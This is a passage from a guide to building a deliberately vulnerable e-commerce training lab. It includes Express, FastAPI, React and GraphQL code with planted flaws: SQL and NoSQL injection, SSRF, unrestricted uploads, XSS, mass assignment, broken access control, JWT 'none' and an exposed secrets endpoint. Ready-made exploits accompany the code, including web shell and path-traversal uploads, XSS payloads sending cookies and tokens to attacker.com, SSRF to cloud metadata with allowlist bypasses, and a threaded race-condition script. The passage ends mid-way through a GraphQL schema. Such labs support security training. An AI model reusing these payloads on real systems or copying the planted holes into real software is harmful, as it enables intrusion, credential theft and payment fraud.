const { authenticate } = require('../middleware/auth');
const { pool } = require('../server');

// ==========================================
// VULNERABILITY: No file type validation
// VULNERABILITY: No file size limit
// VULNERABILITY: Original filename used (path traversal possible)
// VULNERABILITY: Uploaded files served as static files (RCE if server processes them)
// ==========================================
const storage = multer.diskStorage({
  destination: '/app/uploads/',
  filename: (req, file, cb) => {
    // VULNERABLE: Using original filename allows path traversal
    // and arbitrary file extension
    cb(null, file.originalname);
  }
});

const upload = multer({ storage });  // No fileFilter, no limits

router.post('/avatar', authenticate, upload.single('avatar'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' });

  try {
    await pool.query(
      'INSERT INTO file_uploads (user_id, filename, original_filename, file_path, mime_type, file_size) VALUES ($1, $2, $3, $4, $5, $6)',
      [req.user.user_id, req.file.filename, req.file.originalname,
       req.file.path, req.file.mimetype, req.file.size]
    );

    res.json({
      message: 'File uploaded',
      url: `/uploads/${req.file.filename}`
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ==========================================
// VULNERABILITY: Directory listing of uploads
// ==========================================
router.get('/list', authenticate, async (req, res) => {
  const fs = require('fs');
  const files = fs.readdirSync('/app/uploads/');
  res.json({ files });
});

module.exports = router;
```

**Exploitation:**

```bash
# Upload a web shell disguised as an image
curl -X POST http://localhost:4000/api/upload/avatar \
  -H "Authorization: Bearer <token>" \
  -F "avatar=@webshell.php;filename=shell.php"

# Upload with path traversal to overwrite server files
curl -X POST http://localhost:4000/api/upload/avatar \
  -H "Authorization: Bearer <token>" \
  -F "avatar=@malicious.js;filename=../server.js"

# Upload HTML file for stored XSS
cat > /tmp/xss.html << 'PAYLOAD'
<html><body>
<script>
fetch('https://attacker.com/steal?cookie='+document.cookie);
</script>
</body></html>
PAYLOAD

curl -X POST http://localhost:4000/api/upload/avatar \
  -H "Authorization: Bearer <token>" \
  -F "avatar=@/tmp/xss.html;filename=profile.html"

# Access the uploaded XSS: http://localhost:4000/uploads/profile.html

# Upload SVG with embedded JavaScript
cat > /tmp/xss.svg << 'PAYLOAD'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <text x="10" y="30">XSS via SVG</text>
</svg>
PAYLOAD

curl -X POST http://localhost:4000/api/upload/avatar \
  -H "Authorization: Bearer <token>" \
  -F "avatar=@/tmp/xss.svg;filename=avatar.svg"
```

**Difficulty:** Easy (no validation), Medium (path traversal)

### 4.8 SSRF Endpoint

```javascript
// express-api/routes/fetch.js
const express = require('express');
const router = express.Router();
const axios = require('axios');
const { authenticate } = require('../middleware/auth');

// ==========================================
// VULNERABILITY: Server-Side Request Forgery
// No URL validation, no allowlist, follows redirects
// ==========================================
router.post('/url', authenticate, async (req, res) => {
  const { url } = req.body;

  if (!url) return res.status(400).json({ error: 'URL is required' });

  try {
    // VULNERABLE: Fetches any URL the server can reach
    const response = await axios.get(url, {
      timeout: 10000,
      maxRedirects: 5,        // Follows redirects (redirect-based bypass)
      validateStatus: null    // Accept any status code
    });

    res.json({
      status: response.status,
      headers: response.headers,
      body: typeof response.data === 'string'
        ? response.data.substring(0, 10000)
        : response.data
    });
  } catch (err) {
    res.status(500).json({
      error: 'Failed to fetch URL',
      details: err.message  // VULNERABILITY: Leaks internal error details
    });
  }
});

// ==========================================
// "Secured" version with bypass-able allowlist
// ==========================================
router.post('/url-v2', authenticate, async (req, res) => {
  const { url } = req.body;

  // VULNERABILITY: Allowlist check on hostname only, bypassable
  const parsed = new URL(url);
  const blockedHosts = ['localhost', '127.0.0.1', '169.254.169.254'];

  if (blockedHosts.includes(parsed.hostname)) {
    return res.status(403).json({ error: 'Blocked host' });
  }

  // Bypass: Use 0x7f000001, [::1], 017700000001, DNS rebinding, etc.
  try {
    const response = await axios.get(url, { timeout: 10000 });
    res.json({ status: response.status, body: response.data });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
```

**Exploitation:**

```http
# Direct SSRF to cloud metadata
POST /api/fetch/url HTTP/1.1
Host: localhost:4000
Authorization: Bearer <token>
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

# SSRF to internal services
{
  "url": "http://postgres:5432"
}

{
  "url": "http://mongo:27017"
}

{
  "url": "http://redis:6379"
}

# SSRF to LocalStack (internal AWS)
{
  "url": "http://localstack:4566/health"
}

# Bypass the v2 allowlist
{
  "url": "http://0x7f000001/api/debug/config"
}

{
  "url": "http://[::ffff:127.0.0.1]/api/debug/config"
}

{
  "url": "http://127.0.0.1.nip.io/api/debug/config"
}

{
  "url": "http://2130706433/api/debug/config"
}
```

**Difficulty:** Easy (v1 endpoint), Medium (v2 bypass)

### 4.9 Race Condition Vulnerable Checkout

```javascript
// express-api/routes/coupons.js
const express = require('express');
const router = express.Router();
const { pool } = require('../server');
const { authenticate } = require('../middleware/auth');

// ==========================================
// VULNERABILITY: Race condition on coupon application
// Check-then-use without transaction isolation
// ==========================================
router.post('/apply', authenticate, async (req, res) => {
  const { coupon_code, order_id } = req.body;

  try {
    // Step 1: Check if coupon is valid (READ)
    const couponResult = await pool.query(
      'SELECT * FROM coupons WHERE code = $1 AND is_active = true',
      [coupon_code]
    );

    if (couponResult.rows.length === 0) {
      return res.status(404).json({ error: 'Invalid coupon' });
    }

    const coupon = couponResult.rows[0];

    // Step 2: Check usage limit (READ)
    // VULNERABLE: Time gap between check and update allows race condition
    if (coupon.current_uses >= coupon.max_uses) {
      return res.status(400).json({ error: 'Coupon usage limit reached' });
    }

    // Artificial delay to widen the race window (simulates real DB load)
    await new Promise(resolve => setTimeout(resolve, 100));

    // Step 3: Apply discount to order (WRITE)
    const orderResult = await pool.query(
      'SELECT * FROM orders WHERE order_number = $1 AND user_id = $2',
      [order_id, req.user.user_id]
    );

    if (orderResult.rows.length === 0) {
      return res.status(404).json({ error: 'Order not found' });
    }

    const order = orderResult.rows[0];
    const discount = (order.total * coupon.discount_percent) / 100;

    // Step 4: Update order and coupon usage (WRITE)
    await pool.query(
      'UPDATE orders SET discount = $1, total = total - $1 WHERE order_number = $2',
      [discount, order_id]
    );

    await pool.query(
      'UPDATE coupons SET current_uses = current_uses + 1 WHERE code = $1',
      [coupon_code]
    );

    res.json({
      message: 'Coupon applied',
      discount: discount,
      new_total: order.total - discount
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
```

**Exploitation -- Race condition with concurrent requests:**

```python
#!/usr/bin/env python3
"""Race condition exploit for SINGLE50 coupon (50% off, single use)"""

import requests
import threading
import time

BASE_URL = "http://localhost:4000"
TOKEN = "<bob_token>"  # Bob's JWT token
ORDER_ID = "ORD-2024-0005"  # Bob's unpaid order
COUPON = "SINGLE50"

results = []

def apply_coupon():
    resp = requests.post(
        f"{BASE_URL}/api/coupons/apply",
        json={"coupon_code": COUPON, "order_id": ORDER_ID},
        headers={"Authorization": f"Bearer {TOKEN}"}
    )
    results.append({"status": resp.status_code, "body": resp.json()})

# Launch 20 concurrent requests
threads = []
for i in range(20):
    t = threading.Thread(target=apply_coupon)
    threads.append(t)

# Start all threads simultaneously
for t in threads:
    t.start()

# Wait for completion
for t in threads:
    t.join()

# Check results
successes = [r for r in results if r["status"] == 200]
print(f"Successful applications: {len(successes)} (should be 1)")
for s in successes:
    print(f"  Discount: ${s['body'].get('discount', 'N/A')}")
```

**Difficulty:** Medium

### 4.10 Mass Assignment Vulnerable User Update

```javascript
// express-api/routes/users.js
const express = require('express');
const router = express.Router();
const { pool } = require('../server');
const { authenticate } = require('../middleware/auth');

// ==========================================
// VULNERABILITY: Mass assignment
// Spreads all request body fields into UPDATE query
// ==========================================
router.put('/profile', authenticate, async (req, res) => {
  try {
    const allowedFields = req.body;  // No field filtering

    // Build dynamic update query from all provided fields
    const fields = Object.keys(allowedFields);
    const values = Object.values(allowedFields);

    if (fields.length === 0) {
      return res.status(400).json({ error: 'No fields to update' });
    }

    const setClause = fields.map((f, i) => `${f} = $${i + 1}`).join(', ');
    values.push(req.user.user_id);

    const query = `UPDATE users SET ${setClause}, updated_at = NOW() WHERE id = $${values.length} RETURNING *`;
    const result = await pool.query(query, values);

    res.json({ user: result.rows[0] });
  } catch (err) {
    res.status(500).json({ error: 'Server error', details: err.message });
  }
});

// ==========================================
// VULNERABILITY: User data returned includes sensitive fields
// ==========================================
router.get('/profile', authenticate, async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM users WHERE id = $1', [req.user.user_id]);
    // Returns EVERYTHING including ssn_encrypted, password_hash
    res.json({ user: result.rows[0] });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
```

**Exploitation:**

```http
# Escalate to admin role
PUT /api/users/profile HTTP/1.1
Host: localhost:4000
Authorization: Bearer <bob_token>
Content-Type: application/json

{
  "name": "Bob Smith",
  "role": "admin",
  "subscription_tier": "enterprise",
  "credit_balance": 99999.99,
  "is_active": true
}

# Response includes the updated role: "admin"
```

**Difficulty:** Easy

### 4.11 Broken RBAC (Role Bypass)

```javascript
// express-api/routes/admin.js
const express = require('express');
const router = express.Router();
const { pool } = require('../server');
const { authenticate, requireAdmin } = require('../middleware/auth');

// This route correctly requires admin
router.get('/users', authenticate, requireAdmin, async (req, res) => {
  const result = await pool.query('SELECT id, email, name, role, subscription_tier, credit_balance FROM users');
  res.json(result.rows);
});

// ==========================================
// VULNERABILITY: Missing requireAdmin middleware
// Any authenticated user can access these admin endpoints
// ==========================================
router.delete('/users/:id', authenticate, async (req, res) => {
  // BUG: requireAdmin middleware is missing
  try {
    await pool.query('DELETE FROM users WHERE id = $1', [req.params.id]);
    res.json({ message: 'User deleted' });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

router.put('/users/:id/role', authenticate, async (req, res) => {
  // BUG: requireAdmin middleware is missing
  const { role } = req.body;
  try {
    const result = await pool.query(
      'UPDATE users SET role = $1 WHERE id = $2 RETURNING id, email, role',
      [role, req.params.id]
    );
    res.json(result.rows[0]);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ==========================================
// VULNERABILITY: Admin dashboard data with no auth at all
// ==========================================
router.get('/dashboard', async (req, res) => {
  // No authentication middleware at all
  try {
    const users = await pool.query('SELECT COUNT(*) FROM users');
    const orders = await pool.query('SELECT COUNT(*), SUM(total) FROM orders');
    const revenue = await pool.query("SELECT SUM(total) FROM orders WHERE payment_status = 'paid'");

    res.json({
      total_users: users.rows[0].count,
      total_orders: orders.rows[0].count,
      total_revenue: revenue.rows[0].sum,
      order_total: orders.rows[0].sum
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
```

**Exploitation:**

```http
# Delete a user as a regular customer (missing admin check)
DELETE /api/admin/users/3 HTTP/1.1
Host: localhost:4000
Authorization: Bearer <bob_token>

# Change another user's role (missing admin check)
PUT /api/admin/users/4/role HTTP/1.1
Host: localhost:4000
Authorization: Bearer <bob_token>
Content-Type: application/json

{
  "role": "admin"
}

# Access admin dashboard without any authentication
GET /api/admin/dashboard HTTP/1.1
Host: localhost:4000
```

**Difficulty:** Easy (missing middleware), Easy (no auth on dashboard)

### 4.12 Payment Manipulation

```javascript
// express-api/routes/orders.js
const express = require('express');
const router = express.Router();
const { pool } = require('../server');
const { authenticate } = require('../middleware/auth');

// ==========================================
// VULNERABILITY: Client-side price trust
// Server uses the price sent by the client instead of looking up from DB
// ==========================================
router.post('/checkout', authenticate, async (req, res) => {
  const { items, shipping_address } = req.body;

  try {
    let total = 0;
    const orderItems = [];

    for (const item of items) {
      // VULNERABLE: Trusts client-supplied price
      const itemTotal = item.price * item.quantity;
      total += itemTotal;
      orderItems.push({
        product_id: item.product_id,
        quantity: item.quantity,
        unit_price: item.price,      // Should fetch from DB
        total_price: itemTotal
      });
    }

    // Create order with client-controlled total
    const orderNumber = `ORD-${Date.now()}`;
    const orderResult = await pool.query(
      'INSERT INTO orders (order_number, user_id, total, shipping_address) VALUES ($1, $2, $3, $4) RETURNING *',
      [orderNumber, req.user.user_id, total, shipping_address]
    );

    // Insert order items
    for (const item of orderItems) {
      await pool.query(
        'INSERT INTO order_items (order_id, product_id, quantity, unit_price, total_price) VALUES ($1, $2, $3, $4, $5)',
        [orderResult.rows[0].id, item.product_id, item.quantity, item.unit_price, item.total_price]
      );
    }

    res.status(201).json({
      order: orderResult.rows[0],
      items: orderItems
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ==========================================
// VULNERABILITY: Negative quantity/price for refund manipulation
// ==========================================
router.post('/refund', authenticate, async (req, res) => {
  const { order_number, items } = req.body;

  try {
    const order = await pool.query(
      'SELECT * FROM orders WHERE order_number = $1 AND user_id = $2',
      [order_number, req.user.user_id]
    );

    if (order.rows.length === 0) return res.status(404).json({ error: 'Order not found' });

    let refundAmount = 0;
    for (const item of items) {
      // VULNERABLE: No validation that quantity is positive
      refundAmount += item.quantity * item.unit_price;
    }

    // Add refund as credit to user account
    await pool.query(
      'UPDATE users SET credit_balance = credit_balance + $1 WHERE id = $2',
      [refundAmount, req.user.user_id]
    );

    res.json({ refund_amount: refundAmount, message: 'Refund processed' });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
```

**Exploitation:**

```http
# Buy a $1,299.99 laptop for $0.01
POST /api/orders/checkout HTTP/1.1
Host: localhost:4000
Authorization: Bearer <token>
Content-Type: application/json

{
  "items": [
    {"product_id": 1, "quantity": 1, "price": 0.01}
  ],
  "shipping_address": "123 Attacker St"
}

# Generate infinite credit via negative quantity refund
POST /api/orders/refund HTTP/1.1
Host: localhost:4000
Authorization: Bearer <token>
Content-Type: application/json

{
  "order_number": "ORD-2024-0003",
  "items": [
    {"quantity": -100, "unit_price": -99.99}
  ]
}
```

**Difficulty:** Easy (price manipulation), Medium (negative value abuse)

---

## 5. FastAPI Backend Alternative

```dockerfile
# fastapi-api/Dockerfile
FROM python:3.12-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
RUN mkdir -p /app/uploads
EXPOSE 8000
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
```

```
# fastapi-api/requirements.txt
fastapi==0.109.0
uvicorn==0.27.0
sqlalchemy==2.0.25
psycopg2-binary==2.9.9
pymongo==4.6.1
python-jose==3.3.0
passlib==1.7.4
bcrypt==4.1.2
python-multipart==0.0.6
httpx==0.26.0
boto3==1.34.25
```

```python
# fastapi-api/main.py
from fastapi import FastAPI, Depends, HTTPException, Request, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker, Session
from pymongo import MongoClient
from jose import jwt
from passlib.context import CryptContext
import httpx
import os
import shutil
from typing import Optional
from pydantic import BaseModel

app = FastAPI(title="VulnCommerce FastAPI", version="1.0.0")

# ==========================================
# VULNERABILITY: Wildcard CORS
# ==========================================
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.mount("/uploads", StaticFiles(directory="/app/uploads"), name="uploads")

# Database setup
DATABASE_URL = os.getenv("DATABASE_URL")
engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(bind=engine)
mongo_client = MongoClient(os.getenv("MONGODB_URI"))
mongo_db = mongo_client.vulncommerce

JWT_SECRET = os.getenv("JWT_SECRET", "supersecretkey123")
pwd_context = CryptContext(schemes=["bcrypt"])


def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


def get_current_user(request: Request):
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        raise HTTPException(401, "Not authenticated")
    token = auth.split(" ")[1]
    try:
        # VULNERABILITY: No algorithm restriction
        payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256", "HS384", "HS512", "none"])
        return payload
    except Exception:
        raise HTTPException(401, "Invalid token")


# ==========================================
# SQL INJECTION -- String formatting in raw SQL
# ==========================================
@app.get("/api/products/search")
async def search_products(q: str = "", category: str = "", sort: str = "id",
                          db: Session = Depends(get_db)):
    try:
        # VULNERABLE: f-string SQL construction
        query = f"SELECT * FROM products WHERE 1=1"
        if q:
            query += f" AND (name ILIKE '%{q}%' OR description ILIKE '%{q}%')"
        if category:
            query += f" AND category = '{category}'"
        query += f" ORDER BY {sort}"

        result = db.execute(text(query))
        rows = [dict(row._mapping) for row in result]
        return rows
    except Exception as e:
        # VULNERABILITY: Verbose error
        raise HTTPException(500, detail=str(e))


# ==========================================
# SSRF -- Unrestricted URL fetching
# ==========================================
class FetchRequest(BaseModel):
    url: str

@app.post("/api/fetch/url")
async def fetch_url(req: FetchRequest, user=Depends(get_current_user)):
    try:
        async with httpx.AsyncClient(follow_redirects=True, timeout=10.0) as client:
            response = await client.get(req.url)
        return {
            "status": response.status_code,
            "headers": dict(response.headers),
            "body": response.text[:10000]
        }
    except Exception as e:
        raise HTTPException(500, detail=str(e))


# ==========================================
# FILE UPLOAD -- No validation
# ==========================================
@app.post("/api/upload/avatar")
async def upload_avatar(avatar: UploadFile = File(...), user=Depends(get_current_user)):
    # VULNERABLE: No file type check, no size limit, original filename used
    file_path = f"/app/uploads/{avatar.filename}"
    with open(file_path, "wb") as f:
        shutil.copyfileobj(avatar.file, f)
    return {"message": "Uploaded", "url": f"/uploads/{avatar.filename}"}


# ==========================================
# IDOR -- No ownership verification
# ==========================================
@app.get("/api/invoices/{invoice_number}")
async def get_invoice(invoice_number: str, user=Depends(get_current_user),
                      db: Session = Depends(get_db)):
    result = db.execute(
        text("SELECT i.*, u.name, u.email, u.address, u.phone FROM invoices i "
             "JOIN users u ON i.user_id = u.id WHERE i.invoice_number = :inv"),
        {"inv": invoice_number}
    )
    row = result.fetchone()
    if not row:
        raise HTTPException(404, "Invoice not found")
    # MISSING: ownership check
    return dict(row._mapping)


# ==========================================
# NOSQL INJECTION -- Direct query parameter pass
# ==========================================
@app.get("/api/reviews/product/{product_id}")
async def get_reviews(product_id: int, min_rating: Optional[str] = None):
    filter_query = {"product_id": product_id}
    if min_rating:
        try:
            import json
            # VULNERABLE: Parses JSON from query parameter, allowing operator injection
            filter_query["rating"] = json.loads(min_rating)
        except (json.JSONDecodeError, TypeError):
            filter_query["rating"] = int(min_rating)

    reviews = list(mongo_db.reviews.find(filter_query, {"_id": 0}))
    return reviews


# ==========================================
# MASS ASSIGNMENT -- No field filtering
# ==========================================
@app.put("/api/users/profile")
async def update_profile(request: Request, user=Depends(get_current_user),
                         db: Session = Depends(get_db)):
    body = await request.json()
    # VULNERABLE: All fields passed directly to SQL update
    set_clauses = ", ".join([f"{k} = :{k}" for k in body.keys()])
    body["user_id"] = user["user_id"]
    db.execute(
        text(f"UPDATE users SET {set_clauses}, updated_at = NOW() WHERE id = :user_id"),
        body
    )
    db.commit()
    return {"message": "Profile updated"}


# ==========================================
# BROKEN RBAC -- Admin endpoint without role check
# ==========================================
@app.get("/api/admin/dashboard")
async def admin_dashboard(db: Session = Depends(get_db)):
    # VULNERABILITY: No authentication at all
    users = db.execute(text("SELECT COUNT(*) as count FROM users")).fetchone()
    orders = db.execute(text("SELECT COUNT(*) as count, SUM(total) as total FROM orders")).fetchone()
    return {
        "total_users": users.count,
        "total_orders": orders.count,
        "total_revenue": str(orders.total)
    }


@app.delete("/api/admin/users/{user_id}")
async def delete_user(user_id: int, user=Depends(get_current_user),
                      db: Session = Depends(get_db)):
    # VULNERABILITY: No role check - any authenticated user can delete
    db.execute(text("DELETE FROM users WHERE id = :id"), {"id": user_id})
    db.commit()
    return {"message": "User deleted"}


# ==========================================
# PAYMENT MANIPULATION
# ==========================================
class CheckoutItem(BaseModel):
    product_id: int
    quantity: int
    price: float

class CheckoutRequest(BaseModel):
    items: list[CheckoutItem]
    shipping_address: str

@app.post("/api/orders/checkout")
async def checkout(req: CheckoutRequest, user=Depends(get_current_user),
                   db: Session = Depends(get_db)):
    import time
    total = sum(item.price * item.quantity for item in req.items)
    order_number = f"ORD-{int(time.time())}"

    db.execute(
        text("INSERT INTO orders (order_number, user_id, total, shipping_address) "
             "VALUES (:on, :uid, :total, :addr)"),
        {"on": order_number, "uid": user["user_id"], "total": total,
         "addr": req.shipping_address}
    )
    db.commit()
    return {"order_number": order_number, "total": total}


# ==========================================
# DEBUG ENDPOINT -- Exposed in production
# ==========================================
@app.get("/api/debug/config")
async def debug_config():
    return {
        "database_url": DATABASE_URL,
        "jwt_secret": JWT_SECRET,
        "aws_key": os.getenv("AWS_ACCESS_KEY_ID"),
        "mongodb_uri": os.getenv("MONGODB_URI"),
        "env": dict(os.environ)
    }
```

**Difficulty:** Same as Node.js endpoints -- this provides an alternative backend for hunters who prefer testing Python applications.

---

## 6. React Frontend with Intentional XSS Vulnerabilities

```dockerfile
# frontend/Dockerfile
FROM node:20-slim
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 3000
CMD ["npm", "start"]
```

```json
// frontend/package.json
{
  "name": "vulncommerce-frontend",
  "version": "1.0.0",
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "react-scripts": "5.0.1",
    "react-router-dom": "^6.21.0",
    "react-markdown": "^9.0.1",
    "axios": "^1.6.5",
    "dompurify": "^3.0.8"
  },
  "scripts": {
    "start": "react-scripts start",
    "build": "react-scripts build"
  }
}
```

```jsx
// frontend/src/components/ProductReview.jsx
import React, { useState, useEffect } from 'react';
import axios from 'axios';

const ProductReview = ({ productId }) => {
  const [reviews, setReviews] = useState([]);
  const [newReview, setNewReview] = useState({ title: '', comment: '', rating: 5 });

  useEffect(() => {
    axios.get(`/api/reviews/product/${productId}`)
      .then(res => setReviews(res.data));
  }, [productId]);

  return (
    <div className="reviews">
      <h3>Customer Reviews</h3>

      {reviews.map((review, index) => (
        <div key={index} className="review-card">
          <h4>{review.user_name}</h4>
          <div className="rating">{'★'.repeat(review.rating)}</div>

          {/* ==========================================
              VULNERABILITY: Stored XSS via dangerouslySetInnerHTML
              Review title is rendered as raw HTML
              ========================================== */}
          <h5 dangerouslySetInnerHTML={{ __html: review.title }} />

          {/* ==========================================
              VULNERABILITY: Stored XSS via dangerouslySetInnerHTML
              Review comment body is also rendered as raw HTML
              ========================================== */}
          <div
            className="review-body"
            dangerouslySetInnerHTML={{ __html: review.comment }}
          />

          <span className="helpful">
            {review.helpful_votes} people found this helpful
          </span>
        </div>
      ))}

      <div className="new-review">
        <h4>Write a Review</h4>
        <input
          type="text"
          placeholder="Review title"
          value={newReview.title}
          onChange={e => setNewReview({ ...newReview, title: e.target.value })}
        />
        <textarea
          placeholder="Your review (HTML supported for formatting)"
          value={newReview.comment}
          onChange={e => setNewReview({ ...newReview, comment: e.target.value })}
        />
        <select
          value={newReview.rating}
          onChange={e => setNewReview({ ...newReview, rating: parseInt(e.target.value) })}
        >
          {[1,2,3,4,5].map(n => <option key={n} value={n}>{n} stars</option>)}
        </select>
        <button onClick={() => {/* submit review */}}>Submit Review</button>
      </div>
    </div>
  );
};

export default ProductReview;
```

```jsx
// frontend/src/components/UserProfile.jsx
import React, { useState, useEffect } from 'react';
import ReactMarkdown from 'react-markdown';
import rehypeRaw from 'rehype-raw';
import axios from 'axios';

const UserProfile = () => {
  const [profile, setProfile] = useState(null);
  const [bio, setBio] = useState('');

  useEffect(() => {
    axios.get('/api/users/profile', {
      headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }
    }).then(res => {
      setProfile(res.data.user);
      setBio(res.data.user.bio || '');
    });
  }, []);

  if (!profile) return <div>Loading...</div>;

  return (
    <div className="profile">
      <h2>{profile.name}</h2>

      {/* ==========================================
          VULNERABILITY: XSS via unvalidated markdown with rehypeRaw
          Allows raw HTML inside markdown, including script tags
          ========================================== */}
      <div className="bio">
        <h3>Bio</h3>
        <ReactMarkdown rehypePlugins={[rehypeRaw]}>
          {bio}
        </ReactMarkdown>
      </div>

      <div className="edit-bio">
        <textarea
          value={bio}
          onChange={e => setBio(e.target.value)}
          placeholder="Write your bio (Markdown supported)"
        />
        <button onClick={() => {
          axios.put('/api/users/profile', { bio }, {
            headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }
          });
        }}>
          Save Bio
        </button>
      </div>

      {/* ==========================================
          VULNERABILITY: Reflected XSS via URL parameter
          ========================================== */}
      <div className="search-results">
        <h3>Search Results for: </h3>
        <span dangerouslySetInnerHTML={{
          __html: new URLSearchParams(window.location.search).get('q') || ''
        }} />
      </div>
    </div>
  );
};

export default UserProfile;
```

```jsx
// frontend/src/components/InvoiceViewer.jsx
import React, { useState } from 'react';
import axios from 'axios';

const InvoiceViewer = () => {
  const [invoiceNumber, setInvoiceNumber] = useState('');
  const [invoice, setInvoice] = useState(null);
  const [error, setError] = useState('');

  const fetchInvoice = async () => {
    try {
      const token = localStorage.getItem('token');
      const res = await axios.get(`/api/invoices/${invoiceNumber}`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      setInvoice(res.data);
      setError('');
    } catch (err) {
      setError(err.response?.data?.error || 'Failed to fetch invoice');
      setInvoice(null);
    }
  };

  return (
    <div className="invoice-viewer">
      <h2>Invoice Lookup</h2>
      <div>
        <input
          type="text"
          value={invoiceNumber}
          onChange={e => setInvoiceNumber(e.target.value)}
          placeholder="Enter invoice number (e.g., INV-2024-0001)"
        />
        <button onClick={fetchInvoice}>Fetch</button>
      </div>

      {/* Displays invoice data -- demonstrates IDOR visually */}
      {error && <div className="error">{error}</div>}
      {invoice && (
        <div className="invoice-data">
          <h3>Invoice: {invoice.invoice_number}</h3>
          <p><strong>Name:</strong> {invoice.name}</p>
          <p><strong>Email:</strong> {invoice.email}</p>
          <p><strong>Address:</strong> {invoice.address}</p>
          <p><strong>Phone:</strong> {invoice.phone}</p>
          <p><strong>Amount:</strong> ${invoice.amount}</p>
          <p><strong>Card:</strong> {invoice.card_brand} ending in {invoice.card_last4}</p>
        </div>
      )}
    </div>
  );
};

export default InvoiceViewer;
```

**XSS Exploitation Payloads:**

```html
<!-- Stored XSS via review title (dangerouslySetInnerHTML) -->
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

<!-- Stored XSS via review comment -->
<svg onload="new Image().src='https://attacker.com/log?token='+localStorage.getItem('token')">

<!-- XSS via Markdown with rehypeRaw -->
Write this as your bio:
# My Bio
I love security research!
<img src=x onerror="alert(document.domain)">

<!-- Reflected XSS via search parameter -->
http://localhost:3000/profile?q=<script>alert(document.cookie)</script>
http://localhost:3000/profile?q=<img src=x onerror=alert(1)>
```

**Difficulty:** Easy (dangerouslySetInnerHTML), Medium (Markdown XSS), Easy (reflected XSS)

---

## 7. Vulnerable GraphQL API (Apollo Server)

```javascript
// graphql-api/package.json
{
  "name": "vulncommerce-graphql",
  "version": "1.0.0",
  "dependencies": {
    "@apollo/server": "^4.10.0",
    "graphql": "^16.8.1",
    "pg": "^8.12.0",
    "mongoose": "^8.1.0"
  },
  "scripts": {
    "start": "node server.js"
  }
}
```

```dockerfile
# graphql-api/Dockerfile
FROM node:20-slim
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 4001
CMD ["node", "server.js"]
```

```javascript
// graphql-api/server.js
const { ApolloServer } = require('@apollo/server');
const { startStandaloneServer } = require('@apollo/server/standalone');
const { Pool } = require('pg');
const mongoose = require('mongoose');

const pool = new Pool({ connectionString: process.env.DATABASE_URL });
mongoose.connect(process.env.MONGODB_URI);

// ==========================================
// VULNERABILITY: Introspection enabled in production
// VULNERABILITY: No authentication on any resolver
// VULNERABILITY: No query depth limiting
// VULNERABILITY: No query complexity analysis
// VULNERABILITY: No rate limiting
// ==========================================

const typeDefs = `#graphql
  type User {
    id: Int!
    uuid: String!
    email: String!
    name: String!
    role: String!
    subscription_tier: String
    credit_balance: Float
    phone: String
    address: String
    ssn_encrypted: String
    password_hash: String
    orders: [Order!]
    invoices: [Invoice!]
    api_keys: [ApiKey!]
  }

  type Product {
    id: Int!
    name: String!
    description: String
    price: Float!
    stock: Int!
    category: String
    reviews: [Review!]
  }

  type Order {
    id: Int!
    order_number: String!
    user_id: Int!
    user: User
    total: Float!
    discount: Float
    status: String!
    payment_status: String!
    shipping_address: String
    items: [OrderItem!]
  }

  type OrderItem {
    id: Int!
    product: Product
    quantity: Int!
    unit_price: Float!
    total_price: Float!
  }

  type Invoice {
    id: Int!
    invoice_number: String!
    user_id: Int!
    user: User
    amount: Float!
    tax: Float
    billing_name: String
    billing_address: String
    card_last4: String
    card_brand: String
  }

  type ApiKey {
    id: Int!
    key_hash: String!
    key_prefix: String!
    name: String
    permissions: String
    is_active: Boolean
  }

  type Review {
    product_id: Int!
    user_id: Int!
    user_name: String!
    rating: Int!
    title: String!
    comment: String!
    helpful_votes: Int
  }

  type InternalConfig {
    app_name: String
    stripe_secret_key: String
    sendgrid_api_key: String
    aws_access_key: String
    aws_secret_key: String
    admin_api_key: String
    database_master_password: String
    jwt_secret: String
  }

  type Query {
    # User queries (NO AUTH CHECK)
    user(id: Int!): User
    userByEmail(email: String!): User
    users(role: String): [User!]!

    # Product queries
    products(category: String): [Product!]!
    product(id: Int!): Product

    # Order queries (NO AUTH CHECK - any user's orders accessible)
    orders(user_id: Int): [Order!]!
    order(id: Int!): Order

    # Invoice queries (NO AUTH CHECK)
    invoices(user_id: Int): [Invoice!]!
    invoice(id: Int!): Invoice

    # VULNERABILITY: Internal config exposed via GraphQL
    internalConfig: InternalConfig

    # Search with injection
    searchProducts(query: String!): [Product!]!
  }

  type Mutation {
    # VULNERABILITY: No auth on mutations
    updateUser(id: Int!, role: String, subscription_tier: String, credit_balance: Float): User
    deleteUser(id: Int!): Boolean
